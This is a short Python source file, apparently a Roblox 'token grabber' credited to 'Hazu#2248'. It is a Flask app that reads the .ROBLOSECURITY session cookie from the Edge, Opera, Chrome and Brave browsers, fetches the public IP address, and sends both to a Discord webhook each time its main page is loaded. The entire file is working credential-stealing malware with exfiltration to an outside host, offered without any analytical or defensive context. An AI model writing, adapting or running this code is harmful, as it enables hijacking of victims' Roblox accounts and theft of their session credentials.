import requests, discord_webhook, browser_cookie3, flask

app = flask.Flask(__name__, template_folder="templates", static_folder="static")
webhookURL = "Put your webhook URL here"

def getIndex() -> str:
    with open("index.html", "r") as index:
        content = index.read()
        index.close()
    
    return content

def getIp() -> str:
    request = requests.get("https://ipv4.jsonip.com").json()
    return request["ip"]

def getToken() -> str:
    data = []

    try:
        cookies = browser_cookie3.edge(domain_name="roblox.com")

        for x in cookies:
            if x.name == ".ROBLOSECURITY":
                data.append(x.value)
                return data[0]
    except:
        pass

    try:
        cookies = browser_cookie3.opera(domain_name="roblox.com")

        for x in cookies:
            if x.name == ".ROBLOSECURITY":
                data.append(x.value)
                return data[0]
    except:
        pass

    try:
        cookies = browser_cookie3.chrome(domain_name="roblox.com")

        for x in cookies:
            if x.name == ".ROBLOSECURITY":
                data.append(x.value)
                return data[0]
    except:
        pass 

    try:
        cookies = browser_cookie3.brave(domain_name="roblox.com")

        for x in cookies:
            if x.name == ".ROBLOSECURITY":
                data.append(x.value)
                return data[0]
    except:
        pass 

    return "Couldn't find roblox token"

def sendMessage(content: list):
    webhook = discord_webhook.DiscordWebhook(url=webhookURL, username="Stuff", content="@everyone")

    embed = discord_webhook.DiscordEmbed(title="Made by Hazu#2248", color=242424)
    embed.add_embed_field(name="IP", value=content[0])
    embed.set_description(content[1])

    webhook.add_embed(embed)
    webhook.execute()

@app.route("/", methods=["GET"])
def main():
    ip = str(getIp())
    token = str(getToken())

    sendMessage([ip, token])

    return getIndex()

if __name__ == "__main__":
    app.run(host="0.0.0.0", debug=True, port=8080)